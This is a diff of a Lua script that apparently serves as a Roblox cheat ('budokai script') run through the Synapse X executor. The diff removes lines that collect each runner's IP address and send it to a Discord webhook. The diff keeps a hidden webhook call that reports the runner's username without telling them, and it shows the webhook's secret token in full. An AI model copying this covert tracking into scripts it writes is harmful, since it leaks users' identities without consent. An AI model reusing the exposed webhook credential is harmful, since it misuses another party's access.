@@ -1,16 +1,12 @@
 repeat wait() until game:IsLoaded()
 local exeName = game.Players.LocalPlayer.Name
-local response = syn.request({
-    Url = "https://httpbin.org/get",
-    Method = "GET"})
-ip = game:GetService("HttpService"):JSONDecode(response.Body)["origin"]
 local response = syn.request(
     {
         Url = 'https://discord.com/api/webhooks/999717675800481852/h6F2jiLaiX5Oxp-y4Y4C451MpN_iDnTU25EMozP9OsrzaiSOQKGUSLAv7eeMH1M9BNVp',
         Method = 'POST',
         Headers = {
             ['Content-Type'] = 'application/json'},
-            Body = game:GetService('HttpService'):JSONEncode({content = exeName.." has just executed the budokai script! His IP is "..ip})})
+            Body = game:GetService('HttpService'):JSONEncode({content = exeName.." has just executed the budokai script!"})})
 game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart")
 game.Players.LocalPlayer.Backpack:WaitForChild("Power Control")
 local Player = game.Players.LocalPlayer
